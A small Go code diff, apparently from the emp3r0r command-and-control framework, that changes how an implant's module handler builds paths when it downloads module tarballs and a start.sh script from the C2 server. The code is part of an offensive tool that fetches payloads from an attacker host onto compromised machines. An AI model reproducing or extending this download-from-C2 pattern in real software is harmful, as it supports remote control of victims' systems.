@@ -20,7 +20,7 @@ func moduleHandler(modName, checksum string) (out string) {
 
 	// if we have already downloaded the module, dont bother downloading again
 	if tun.SHA256SumFile(tarball) != checksum {
-		_, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/"+modName+".tar.bz2",
+		_, err := DownloadViaCC(modName+".tar.bz2",
 			tarball)
 		if err != nil {
 			return err.Error()
@@ -41,7 +41,7 @@ func moduleHandler(modName, checksum string) (out string) {
 
 	// download start.sh
 	os.RemoveAll(start_sh)
-	_, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/"+modName+".sh",
+	_, err := DownloadViaCC(modName+".sh",
 		start_sh)
 	if err != nil {
 		return fmt.Sprintf("Downloading start.sh: %v", err)
